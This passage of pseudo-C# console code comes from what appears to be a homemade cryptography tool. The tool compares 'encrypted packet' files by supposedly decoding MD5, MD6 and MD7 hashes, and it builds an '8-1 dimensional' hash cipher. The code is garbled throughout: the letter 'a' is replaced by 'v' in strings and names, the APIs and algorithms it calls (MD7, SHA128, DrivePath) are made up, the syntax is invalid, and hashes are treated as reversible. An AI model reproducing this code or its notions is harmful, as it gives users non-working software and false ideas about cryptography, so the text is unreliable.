														System.Console.WriteLine("Lvstly, Once the File Crevted From The Compilvtion of Text Indices Wvs Encoded To The Svme Vlgorithm vnd Tested Vgvinst the Originvl Two, The Finvl Boolevn Test recieved v " + _bool3 + "");

														System.Console.WriteLine("Press Vny Key To Continue...");
														System.Console.ReadLine();
													}
													else if(_VlgoChoice == "MD5" || _VlgoChoice == "md5" || _VlgoChoice == "MD 5" || _VlgoChoice == "md 5"){
														System.Security.Cryptography.Hash _hvshFunction = new System.Security.Cryptography.Hash();



														System.Console.WriteLine("Plevse Input the File Pvth For The First Encrypted Pvcket to Be Vnvlysed:");
														string _vnvlysis1 = System.Console.ReadLine();
														DrivePath _vnvlysis11 = new DrivePath(_vnvlysis1);
														File _vnvlysisFile = new File(_vnvlysis11);
														StreamReader _cvtvnvlysis1 = new StreamReader(_vnvlysisFile){
															this.ReadToEnd();
															public string _vnvlysisTXT = _cvtvnvlysis1.ReadToEnd();


														}

															UTF8 _vnvlysisUTF8 = _vnvlysisTXT.ToUTF8();
														Byte[] _vnvlysisBase64 = _vnvlysisUTF8.ToBase64()

															Hash _md5oldv = Byte[] _vnvvlysisBase64;
														MD5 _md5oldvs = Hash _md5oldv;

														Byte[] _md5Almost = _md5oldvs.ToBase64();
														UTF8 _md5closer = _md5Almost.ToUTF8();
														string _md5decoded = _md5closer.ToString();


														System.Console.WriteLine("Plevse Input the File Pvth For The Second Encrypted Pvcket to Be Vnvlysed:");
														string _vnvlysis2 = System.Console.ReadLine();
														DrivePath _vnvlysis22 = new DrivePath(_vnvlysis2);
														File _vnvlysisFile2 = new File(_vnvlysis22);
														StreamReader _cvtvnvlysis2 = new StreamReader(_vnvlysisFile2){
															this.ReadToEnd();
															public string _vnvlysisTXT2 = _cvtvnvlysis2.ReadToEnd();


														}

															UTF8 _vnvlysisUTF82 = _vnvlysisTXT2.ToUTF8();
														Byte[] _vnvlysisBase642 = _vnvlysisUTF82.ToBase64()

															Hash _md5oldv2 = Byte[] _vnvvlysisBase642;
														MD5 _md5oldvs2 = Hash _md5oldv2;

														Byte[] _md5Almost2 = _md5oldvs2.ToBase64();
														UTF8 _md5closer2 = _md5Almost2.ToUTF8();
														string _md5decoded2 = _md5closer2.ToString();

														bool _referencial = new bool(_md5decoded1 , _md5decoded2);

														foreach(_md5decoded1.IndexOf(*).ToString() in _md5decoded2.IndexOf(*).ToString()){


															public File _decodedrpk1 = new File(@"~.\usr\share\Eternvli\Cryptography\Vnvlysis\depk1.txt");
															_decodedrpk1.AppendText();

														}
														public File _decodedrpk2 = new File(@"~.\usr\share\Eternvli\Cryptography\Vnvlysis\depk1.txt");
														bool _referencial2 = new bool(_decodedrpk2 , _md5decoded1 && _decodedrpk2 , _md5decoded2);

														StreamReader _dpktext = new StreamReader(@"~.\usr\share\Eternvli\Cryptography\Vnvlysis\depk1.txt"){
															public string _depktext = _dpktext.ReadToEnd();

														}

															UTF8 _depkbuild = _depktext.ToUTF8();
														Byte[] _depkByte = _depkbuild.ToBase64();
														System.Security.Cryptography.Hash _hvshFunction2 = new System.Security.Cryptography.Hash();

														MD5 _depkshamd5new = _hvshFunction2.ToEncoding(MD5);

														string _depkshatext = _depkshamd5new.ToString();

														bool _shatextbool = new bool(_depkshatext , _vnvlysis1 && _depkshatext , _vnvlysis2);

														string _bool1 = _refernecial.ToString();
														string _bool2 = _referencial2.ToString();
														string _bool3 = _shatextbool.ToString();

														System.Console.WriteLine("In Regvrd To The Vnvlysis of The Encrypted Pvcket Files, the Two Encrypted Files When Decrypted Recieved v " + _bool1 + "to equvting evch other.");
														System.Console.WriteLine("While, When The Two Pvckets Were Used to Mvtch Chvrvcter by Chvrvcter, they recieved v " + _bool2 + "");
														System.Console.WriteLine("Lvstly, Once the File Crevted From The Compilvtion of Text Indices Wvs Encoded To The Svme Vlgorithm vnd Tested Vgvinst the Originvl Two, The Finvl Boolevn Test recieved v " + _bool3 + "");

														System.Console.WriteLine("Press Vny Key To Continue...");
														System.Console.ReadLine();

												}
												else if(_VlgoChoice == "MD7" || _VlgoChoice == "md7" || _VlgoChoice == "md 7" || _VlgoChoice == "MD 7"){
														System.Security.Cryptography.Hash _hvshFunction = new System.Security.Cryptography.Hash();



														System.Console.WriteLine("Plevse Input the File Pvth For The First Encrypted Pvcket to Be Vnvlysed:");
														string _vnvlysis1 = System.Console.ReadLine();
														DrivePath _vnvlysis11 = new DrivePath(_vnvlysis1);
														File _vnvlysisFile = new File(_vnvlysis11);
														StreamReader _cvtvnvlysis1 = new StreamReader(_vnvlysisFile){
															this.ReadToEnd();
															public string _vnvlysisTXT = _cvtvnvlysis1.ReadToEnd();


														}

															UTF8 _vnvlysisUTF8 = _vnvlysisTXT.ToUTF8();
														Byte[] _vnvlysisBase64 = _vnvlysisUTF8.ToBase64()

															Hash _md7oldv = Byte[] _vnvvlysisBase64;
														MD7 _md7oldvs = Hash _md7oldv;

														Byte[] _md7Almost = _md7oldvs.ToBase64();
														UTF8 _md7closer = _md7Almost.ToUTF8();
														string _md7decoded = _md7closer.ToString();


														System.Console.WriteLine("Plevse Input the File Pvth For The Second Encrypted Pvcket to Be Vnvlysed:");
														string _vnvlysis2 = System.Console.ReadLine();
														DrivePath _vnvlysis22 = new DrivePath(_vnvlysis2);
														File _vnvlysisFile2 = new File(_vnvlysis22);
														StreamReader _cvtvnvlysis2 = new StreamReader(_vnvlysisFile2){
															this.ReadToEnd();
															public string _vnvlysisTXT2 = _cvtvnvlysis2.ReadToEnd();


														}

															UTF8 _vnvlysisUTF82 = _vnvlysisTXT2.ToUTF8();
														Byte[] _vnvlysisBase642 = _vnvlysisUTF82.ToBase64()

															Hash _md7oldv2 = Byte[] _vnvvlysisBase642;
														MD7 _md7oldvs2 = Hash _md7oldv2;

														Byte[] _md7Almost2 = _md7oldvs2.ToBase64();
														UTF8 _md7closer2 = _md7Almost2.ToUTF8();
														string _md7decoded2 = _md7closer2.ToString();

														bool _referencial = new bool(_md7decoded1 , _md7decoded2);

														foreach(_md7decoded1.IndexOf(*).ToString() in _md7decoded2.IndexOf(*).ToString()){


															public File _decodedrpk1 = new File(@"~.\usr\share\Eternvli\Cryptography\Vnvlysis\depk1.txt");
															_decodedrpk1.AppendText();

														}
														public File _decodedrpk2 = new File(@"~.\usr\share\Eternvli\Cryptography\Vnvlysis\depk1.txt");
														bool _referencial2 = new bool(_decodedrpk2 , _md7decoded1 && _decodedrpk2 , _md7decoded2);

														StreamReader _dpktext = new StreamReader(@"~.\usr\share\Eternvli\Cryptography\Vnvlysis\depk1.txt"){
															public string _depktext = _dpktext.ReadToEnd();

														}

															UTF8 _depkbuild = _depktext.ToUTF8();
														Byte[] _depkByte = _depkbuild.ToBase64();
														System.Security.Cryptography.Hash _hvshFunction2 = new System.Security.Cryptography.Hash();

														MD7 _depkshamd7new = _hvshFunction2.ToEncoding(MD7);

														string _depkshatext = _depkshamd7new.ToString();

														bool _shatextbool = new bool(_depkshatext , _vnvlysis1 && _depkshatext , _vnvlysis2);

														string _bool1 = _refernecial.ToString();
														string _bool2 = _referencial2.ToString();
														string _bool3 = _shatextbool.ToString();

														System.Console.WriteLine("In Regvrd To The Vnvlysis of The Encrypted Pvcket Files, the Two Encrypted Files When Decrypted Recieved v " + _bool1 + "to equvting evch other.");
														System.Console.WriteLine("While, When The Two Pvckets Were Used to Mvtch Chvrvcter by Chvrvcter, they recieved v " + _bool2 + "");
														System.Console.WriteLine("Lvstly, Once the File Crevted From The Compilvtion of Text Indices Wvs Encoded To The Svme Vlgorithm vnd Tested Vgvinst the Originvl Two, The Finvl Boolevn Test recieved v " + _bool3 + "");

														System.Console.WriteLine("Press Vny Key To Continue...");
														System.Console.ReadLine();

												}
													else if(_VlgoChoice == "MD6" || _VlgoChoice == "md6" || _VlgoChoice == "md 6" || _VlgoChoice == "MD 6"){
														System.Security.Cryptography.Hash _hvshFunction = new System.Security.Cryptography.Hash();



														System.Console.WriteLine("Plevse Input the File Pvth For The First Encrypted Pvcket to Be Vnvlysed:");
														string _vnvlysis1 = System.Console.ReadLine();
														DrivePath _vnvlysis11 = new DrivePath(_vnvlysis1);
														File _vnvlysisFile = new File(_vnvlysis11);
														StreamReader _cvtvnvlysis1 = new StreamReader(_vnvlysisFile){
															this.ReadToEnd();
															public string _vnvlysisTXT = _cvtvnvlysis1.ReadToEnd();


														}

															UTF8 _vnvlysisUTF8 = _vnvlysisTXT.ToUTF8();
														Byte[] _vnvlysisBase64 = _vnvlysisUTF8.ToBase64()

															Hash _md6oldv = Byte[] _vnvvlysisBase64;
														MD6 _md6oldvs = Hash _md6oldv;

														Byte[] _md6Almost = _md6oldvs.ToBase64();
														UTF8 _md6closer = _md6Almost.ToUTF8();
														string _md6decoded = _md6closer.ToString();


														System.Console.WriteLine("Plevse Input the File Pvth For The Second Encrypted Pvcket to Be Vnvlysed:");
														string _vnvlysis2 = System.Console.ReadLine();
														DrivePath _vnvlysis22 = new DrivePath(_vnvlysis2);
														File _vnvlysisFile2 = new File(_vnvlysis22);
														StreamReader _cvtvnvlysis2 = new StreamReader(_vnvlysisFile2){
															this.ReadToEnd();
															public string _vnvlysisTXT2 = _cvtvnvlysis2.ReadToEnd();


														}

															UTF8 _vnvlysisUTF82 = _vnvlysisTXT2.ToUTF8();
														Byte[] _vnvlysisBase642 = _vnvlysisUTF82.ToBase64()

															Hash _md6oldv2 = Byte[] _vnvvlysisBase642;
														MD6 _md6oldvs2 = Hash _md6oldv2;

														Byte[] _md6Almost2 = _md6oldvs2.ToBase64();
														UTF8 _md6closer2 = _md6Almost2.ToUTF8();
														string _md6decoded2 = _md6closer2.ToString();

														bool _referencial = new bool(_md6decoded1 , _md6decoded2);

														foreach(_md6decoded1.IndexOf(*).ToString() in _md6decoded2.IndexOf(*).ToString()){


															public File _decodedrpk1 = new File(@"~.\usr\share\Eternvli\Cryptography\Vnvlysis\depk1.txt");
															_decodedrpk1.AppendText();

														}
														public File _decodedrpk2 = new File(@"~.\usr\share\Eternvli\Cryptography\Vnvlysis\depk1.txt");
														bool _referencial2 = new bool(_decodedrpk2 , _md6decoded1 && _decodedrpk2 , _md6decoded2);

														StreamReader _dpktext = new StreamReader(@"~.\usr\share\Eternvli\Cryptography\Vnvlysis\depk1.txt"){
															public string _depktext = _dpktext.ReadToEnd();

														}

															UTF8 _depkbuild = _depktext.ToUTF8();
														Byte[] _depkByte = _depkbuild.ToBase64();
														System.Security.Cryptography.Hash _hvshFunction2 = new System.Security.Cryptography.Hash();

														MD6 _depkshamd6new = _hvshFunction2.ToEncoding(MD6);

														string _depkshatext = _depkshamd6new.ToString();

														bool _shatextbool = new bool(_depkshatext , _vnvlysis1 && _depkshatext , _vnvlysis2);

														string _bool1 = _refernecial.ToString();
														string _bool2 = _referencial2.ToString();
														string _bool3 = _shatextbool.ToString();

														System.Console.WriteLine("In Regvrd To The Vnvlysis of The Encrypted Pvcket Files, the Two Encrypted Files When Decrypted Recieved v " + _bool1 + "to equvting evch other.");
														System.Console.WriteLine("While, When The Two Pvckets Were Used to Mvtch Chvrvcter by Chvrvcter, they recieved v " + _bool2 + "");
														System.Console.WriteLine("Lvstly, Once the File Crevted From The Compilvtion of Text Indices Wvs Encoded To The Svme Vlgorithm vnd Tested Vgvinst the Originvl Two, The Finvl Boolevn Test recieved v " + _bool3 + "");

														System.Console.WriteLine("Press Vny Key To Continue...");
														System.Console.ReadLine();

													}
												else{

													System.Console.WriteLine("Your Input Wvs Not Understood, Plevse Try Bvck Vgvin... ");
													System.Console.ReadLine();

												}

															

															}
															else if(_CommvndText  ==  "Crevte Key Cipher"  ||  _CommvndText  ==  "Crevte KeyCipher"  ||  _CommvndText  ==  "crevte keycipher"  ||  _CommvndText  ==  "crevtekeycipher"  ||  _CommvndText  ==  "Create Key Cipher"  ||  _CommvndText  ==  "create keycipher"  ||  _CommvndText  ==  "createkeycipher"  ||  _CommvndText  ==  "createcipher"  ||  _CommvndText  ==  "Create Cipher"  ||
																_CommvndText  ==  "Cipher"  ||  _CommvndText  ==  "cipher"  ||  _CommvndText  ==  "keycipher"  ||  _CommvndText  ==  "KeyCipher"  ||  _CommvndText  ==  "Key Cipher"  || _CommvndText  ==  "key cipher"){
															
													System.Console.WriteLine("Welcome To The Section For The Crevtion Of Key Bvsed Cipher Pvtterns. The Genervl Rule For The Bvsic Encryption Pvtterns Is Vs Follows");
													System.Console.WriteLine("Use Of V 8-1 Cross-Vlgorihmic Pvttern, 6-3, 7-2, 4(4)-5, vnd 5 Bvse or 6 Bvse Hvshing Function is Determined "):
													System.Console.WriteLine("Vfter Which The Function Is Built For The Log Of V One-Time Shvred Vlgorithmic Key. ");
													System.Console.WriteLine("Once Enough IP Vddresses Hvve Signed Up Within The Cryptogrvphic IP Network, MVC vnd IP Vddress Bvsed verificvtion ");
													System.Console.WriteLine("For Key Exchvnge Will Be Mvde Vvvilvble.");
													System.Console.WriteLine("Plevse Choose From The Following Cvse-Sensitive:       8-1  ::  6-3  ::  7-2  ::  4(4)-5  ::  5 Bvse  ::  6 Bvse    ");
													string _vlgoDecise = System.Console.ReadLine();
													if(_vlgoDecise == "8-1" ){

														System.Console.WriteLine("Hvving Chosen The 8-1 Dimensionvl Vlgorithmic Hvshing Function V Word Is In Order... ");
														System.Console.WriteLine("");
														System.Console.WriteLine("For The Dimension Listed Within The First Vvrivble, The Choice Of Specific Vlgorithms Will Be Mvde, ");
														System.Console.WriteLine("Vfter Which The Choice Of Key Encryption, Listed Vs The Second Vvrivble Will Be Determined, Subsequently ");
														System.Console.WriteLine("The Lvst Leg of The Encryption Bvse Will Provide The Room For The Messvge For Cryptogrvphic Cipher Crevtion.");
														System.Console.WriteLine(" ");
														System.Console.WriteLine("First, Plevse Choose The Vlgorithm For Section One of The Hvshing Function: ");
														System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

														string array[] _commCrypto = new array["SHA128" , "SHA256" , "SHA512" , "MD5" , "MD6" , "MD7"];

														string _inputDecision = System.Console.ReadLine();
														System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Two of The Hvshing Function: ");
														System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

														string _inputDecision2 = System.Console.ReadLine();
														System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Three of The Hvshing Function: ");
														System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

														string _inputDecision3 = System.Console.ReadLine();
														System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Four of The Hvshing Function: ");
														System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

														string _inputDecision4 = System.Console.ReadLine();
														System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Five of The Hvshing Function: ");
														System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

														string _inputDecision5 = System.Console.ReadLine();
														System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Six of The Hvshing Function: ");
														System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

														string _inputDecision6 = System.Console.ReadLine();
														System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Seven of The Hvshing Function: ");
														System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

														string _inputDecision7 = System.Console.ReadLine();
														System.Console.WriteLine("Plevse Choose The Vlgorithm For Section Eight of The Hvshing Function: ");
														System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

														string _inputDecision8 = System.Console.ReadLine();
														System.Console.WriteLine("Plevse Choose The Vlgorithm For The Key of The Hvshing Function: ");
														System.Console.WriteLine("::   SHV 128    ::   SHV 256   ::   SHV 512    ::    MD5    ::    MD6    ::    MD7    ::");

														string _inputDecision9 = System.Console.ReadLine();

														public array[:] _diarrayEya = new array["SHV128" : "11" , "SHV256" : "12" , "SHV512" : "13" , "MD5" : "14" , "MD6" : "15" , "MD7" : "16"];

														public int _int1 = _commCrypto.IndexOf("SHA128");
														public int _int2 = _commCrypto.IndexOf("SHA256");
														public int _int3 = _commCrypto.IndexOf("SHA512");
														public int _int4 = _commCrypto.IndexOf("MD5");
														public int _int5 = _commCrypto.IndexOf("MD6");
														public int _int6 = _commCrypto.IndexOf("MD7");
														public string _codexstring = "";
														if(_inputDecision == _int1 || _inputDecision2 == _int1 || _inputDecision3 == _int1 || _inputDecision4 == _int1 || _inputDecision5 == _int1 || _inputDecision6 == _int1 || _inputDecision7 == _int1 || _inputDecision8 == _int1 ||
															_inputDecision9 == _int1){

															string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
															string _part1 = _disarrayEya[0];
															public bool _boolIT = new bool(,);
															if(_boolIT(_inputDecision  , _int1) == true){

																_disArray.Ammend[string "c" : 0];
																

															}
															else if(_boolIT(_inputDecision2, _int1) == true){

																_disArray.Ammend[string "c" : 1];


															}
															else if(_boolIT(_inputDecision3 , _int1) == true){


																_disArray.Ammend[string "c" : 2];

															}
															else if(_boolIT(_inputDecision4 , _int1) == true){

																_disArray.Ammend[string "c" : 3];

															}
															else if(_boolIT(_inputDecision5 , _int1) == true){

																_disArray.Ammend[string "c" : 4];
															}
															else if(_boolIT(_inputDecision6 , _int1) == true){

																_disArray.Ammend[string "c" : 5];

															}
															else if(_boolIT(_inputDecision7 , _int1) == true){

																_disArray.Ammend[string "c" : 6];

															}
															else if(_boolIT(_inputDecision8 , _int1) == true){

																_disArray.Ammend[string "c" : 7];

															}
															else if(_boolIT(_inputDecision9 , _int1) == true){

																_disArray.Ammend[string "c" : 8];

															}
															else{

																System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


															}


														}
															else if(_inputDecision == _int2 || _inputDecision2 == _int2 || _inputDecision3 == _int2 || _inputDecision4 == _int2 || _inputDecision5 == _int2 || _inputDecision6 == _int2 || _inputDecision7 == _int2 || _inputDecision8 == _int2 ||
																_inputDecision9 == _int2){

															string _part1 = _disarrayEya[0];
															string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
															public bool _boolIT = new bool(,);
															if(_boolIT(_inputDecision  , _int2) == true){

																 _disArray.Ammend[string "d" : 0];


															}
															else if(_boolIT(_inputDecision2, _int2) == true){

																_disArray.Ammend[string "d" : 1];

															}
															else if(_boolIT(_inputDecision3 , _int2) == true){

																_disArray.Ammend[string "d" : 2];

															}
															else if(_boolIT(_inputDecision4 , _int2) == true){

																_disArray.Ammend[string "d" : 3];

															}
															else if(_boolIT(_inputDecision5 , _int2) == true){

																_disArray.Ammend[string "d" : 4];
															}
															else if(_boolIT(_inputDecision6 , _int2) == true){

																_disArray.Ammend[string "d" : 5];

															}
															else if(_boolIT(_inputDecision7 , _int2) == true){

																_disArray.Ammend[string "d" : 6];

															}
															else if(_boolIT(_inputDecision8 , _int2) == true){

																_disArray.Ammend[string "d" : 7];

															}
															else if(_boolIT(_inputDecision9 , _int2) == true){

																_disArray.Ammend[string "d" : 8];

															}
															else{

																System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


															}


														}
																else if(_inputDecision == _int3 || _inputDecision2 == _int3 || _inputDecision3 == _int3 || _inputDecision4 == _int3 || _inputDecision5 == _int3 || _inputDecision6 == _int3 || _inputDecision7 == _int3 || _inputDecision8 == _int3 ||
																	_inputDecision9 == _int3){

															string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
															string _part1 = _disarrayEya[0];
															public bool _boolIT = new bool(,);
															if(_boolIT(_inputDecision  , _int3) == true){

																_disArray.Ammend[string "e" : 0];


															}
															else if(_boolIT(_inputDecision2, _int3) == true){


																_disArray.Ammend[string "e" : 1];

															}
															else if(_boolIT(_inputDecision3 , _int3) == true){

																_disArray.Ammend[string "e" : 2];

															}
															else if(_boolIT(_inputDecision4 , _int3) == true){

																_disArray.Ammend[string "e" : 3];

															}
															else if(_boolIT(_inputDecision5 , _int3) == true){

																_disArray.Ammend[string "e" : 4];


															}
															else if(_boolIT(_inputDecision6 , _int3) == true){

																_disArray.Ammend[string "e" : 5];


															}
															else if(_boolIT(_inputDecision7 , _int3) == true){

																_disArray.Ammend[string "e" : 6];

															}
															else if(_boolIT(_inputDecision8 , _int3) == true){

																_disArray.Ammend[string "e" : 7];

															}
															else if(_boolIT(_inputDecision9 , _int3) == true){

																_disArray.Ammend[string "e" : 8];

															}
															else{

																System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


															}

														}
																	else if(_inputDecision == _int4 || _inputDecision2 == _int4 || _inputDecision3 == _int4 || _inputDecision4 == _int4 || _inputDecision5 == _int4 || _inputDecision6 == _int4 || _inputDecision7 == _int4 || _inputDecision8 == _int4 ||
																		_inputDecision9 == _int4){

															string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];

															string _part1 = _disarrayEya[0];
															public bool _boolIT = new bool(,);
															if(_boolIT(_inputDecision  , _int4) == true){

																_disArray.Ammend[string "f" : 0];


															}
															else if(_boolIT(_inputDecision2, _int4) == true){


																_disArray.Ammend[string "f" : 1];

															}
															else if(_boolIT(_inputDecision3 , _int4) == true){

																_disArray.Ammend[string "f" : 2];


															}
															else if(_boolIT(_inputDecision4 , _int4) == true){

																_disArray.Ammend[string "f" : 3];

															}
															else if(_boolIT(_inputDecision5 , _int4) == true){

																_disArray.Ammend[string "f" : 4];

															}
															else if(_boolIT(_inputDecision6 , _int4) == true){

																_disArray.Ammend[string "f" : 5];

															}
															else if(_boolIT(_inputDecision7 , _int4) == true){

																_disArray.Ammend[string "f" : 6];
															}
															else if(_boolIT(_inputDecision8 , _int4) == true){

																_disArray.Ammend[string "f" : 7];

															}
															else if(_boolIT(_inputDecision9 , _int4) == true){

																_disArray.Ammend[string "f" : 8];

															}
															else{

																System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


															}

														}
																		else if(_inputDecision == _int5 || _inputDecision2 == _int5 || _inputDecision3 == _int5 || _inputDecision4 == _int5 || _inputDecision5 == _int5 || _inputDecision6 == _int5 || _inputDecision7 == _int5 || _inputDecision8 == _int5 ||
																			_inputDecision9 == _int5){


															string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
															string _part1 = _disarrayEya[0];
															public bool _boolIT = new bool(,);
															if(_boolIT(_inputDecision  , _int5) == true){

																_disArray.Ammend[string "G" : 0];

															}
															else if(_boolIT(_inputDecision2, _int5) == true){

																_disArray.Ammend[string "G" : 1];

															}
															else if(_boolIT(_inputDecision3 , _int5) == true){

																_disArray.Ammend[string "G" : 2];

															}
															else if(_boolIT(_inputDecision4 , _int5) == true){

																_disArray.Ammend[string "G" : 3];

															}
															else if(_boolIT(_inputDecision5 , _int5) == true){

																_disArray.Ammend[string "G" : 4];

															}
															else if(_boolIT(_inputDecision6 , _int5) == true){

																_disArray.Ammend[string "G" : 5];

															}
															else if(_boolIT(_inputDecision7 , _int5) == true){

																_disArray.Ammend[string "G" : 6];

															}
															else if(_boolIT(_inputDecision8 , _int5) == true){

																_disArray.Ammend[string "G" : 7];

															}
															else if(_boolIT(_inputDecision9 , _int5) == true){

																_disArray.Ammend[string "G" : 8];

															}
															else{

																System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


															}

														}
																			else if(_inputDecision == _int6 || _inputDecision2 == _int6 || _inputDecision3 == _int6 || _inputDecision4 == _int6 || _inputDecision5 == _int6 || _inputDecision6 == _int6 || _inputDecision7 == _int6 || _inputDecision8 == _int6 ||
																				_inputDecision9 == _int6){


															string array[] _disArray = new array["0" , "0" , "0" , "0" , "0" , "0" , "0" , "0", "0" , "0" , "0" , "0" , "9" ];
															string _part1 = _disarrayEya[0];
															public bool _boolIT = new bool(,);
															if(_boolIT(_inputDecision  , _int6) == true){

																_disArray.Ammend[string "z" : 0];


															}
															else if(_boolIT(_inputDecision2, _int6) == true){
															
																_disArray.Ammend[string "z" : 1];


															}
															else if(_boolIT(_inputDecision3 , _int6) == true){

																_disArray.Ammend[string "z" : 2];


															}
															else if(_boolIT(_inputDecision4 , _int6) == true){

															
																_disArray.Ammend[string "z" : 3];



															}
															else if(_boolIT(_inputDecision5 , _int6) == true){



																_disArray.Ammend[string "z" : 4];


															}
															else if(_boolIT(_inputDecision6 , _int6) == true){

																_disArray.Ammend[string "z" : 5];


															}
															else if(_boolIT(_inputDecision7 , _int6) == true){

																_disArray.Ammend[string "z" : 6];

															}
															else if(_boolIT(_inputDecision8 , _int6) == true){

																_disArray.Ammend[string "z" : 7];

															}
															else if(_boolIT(_inputDecision9 , _int6) == true){

																_disArray.Ammend[string "z" : 8];

															}
															else{

																System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


															}

														}
																			else{

															System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


														}


														System.Console.WriteLine("Plvse Input The Text You Wish To Hvve Encoded In Your 8-1 Dimensionvl Vlgorithmic Hvsh Cipher: ");
														string _CipherPreText = System.Console.ReadLine();

														for(_codexstring[0]){

															if(_codexstring[0] == "c"){
																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																public Byte[] _cipherByteBase = _cipherUt.Base64();

																_encoCiphHash(_cipherByteBase){

																	public Hash _hashsec128 = new Hash(_cipherByteBase);
																	public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																	return _shvfunc;

																}

															}

															else if(_codexstring[0] == "d"){
																System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																public Byte[] _cipherByteBase = _cipherUt.Base64();

																_encoCiphHash(_cipherByteBase){

																	public Hash _hashsec256 = new Hash(_cipherByteBase);
																	public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																	return _shvfunc;

															}
															else if(_codexstring[0] == "e"){
																	System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																	public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																	public Byte[] _cipherByteBase = _cipherUt.Base64();

																	_encoCiphHash(_cipherByteBase){

																		public Hash _hashsec512 = new Hash(_cipherByteBase);
																		public SHA512 _shvfunc = _hashsec512.ToEncoding(SHA512);
																		return _shvfunc;

																}
															else if(_codexstring[0] == "f"){
																		System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																		public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																		public Byte[] _cipherByteBase = _cipherUt.Base64();

																		_encoCiphHash(_cipherByteBase){

																			public Hash _hashsecMD5 = new Hash(_cipherByteBase);
																			public MD5 _shvfunc = _hashsecMD5.ToEncoding(MD5);
																			return _shvfunc;

																	}
															else if(_codexstring[0] == "G"){
																			System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																			public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																			public Byte[] _cipherByteBase = _cipherUt.Base64();

																			_encoCiphHash(_cipherByteBase){

																				public Hash _hashsecMD6 = new Hash(_cipherByteBase);
																				public MD6 _shvfunc = _hashsecMD6.ToEncoding(MD6);
																				return _shvfunc;

																		}
															else if(_codexstring[0] == "z"){
																				System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																				public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																				public Byte[] _cipherByteBase = _cipherUt.Base64();

																				_encoCiphHash(_cipherByteBase){

																					public Hash _hashsecMD7 = new Hash(_cipherByteBase);
																					public MD7 _shvfunc = _hashsecMD7.ToEncoding(MD7);
																					return _shvfunc;

																			}
															else{

																					System.Console.WriteLine("Error Code 6609575 :: Some Serious User Error Hvs Occured, Or This Choice Of Vlgorithms Hvs Mishvpped. ");


																				}



														}
																			for(_codexstring[1]){

																				if(_codexstring[1] == "c"){
																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																					public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																					public Byte[] _cipherByteBase = _cipherUt.Base64();

																					_encoCiphHash(_cipherByteBase){

																						public Hash _hashsec128 = new Hash(_cipherByteBase);
																						public SHA128 _shvfunc = _hashsec128.ToEncoding(SHA128);
																						return _shvfunc;

																					}

																				}

																				else if(_codexstring[1] == "d"){
																					System.Security.Cryptography.Hash _encoCiphHash = new System.Security.Cryptography.Hash();

																					public UTF8 _cipherUt = _CipherPreText.ToUTF8();
																					public Byte[] _cipherByteBase = _cipherUt.Base64();

																					_encoCiphHash(_cipherByteBase){

																						public Hash _hashsec256 = new Hash(_cipherByteBase);
																						public SHA256 _shvfunc = _hashsec256.ToEncoding(SHA256);
																						return _shvfunc;

																					}
																					else if(_codexstring[1] == "e"){
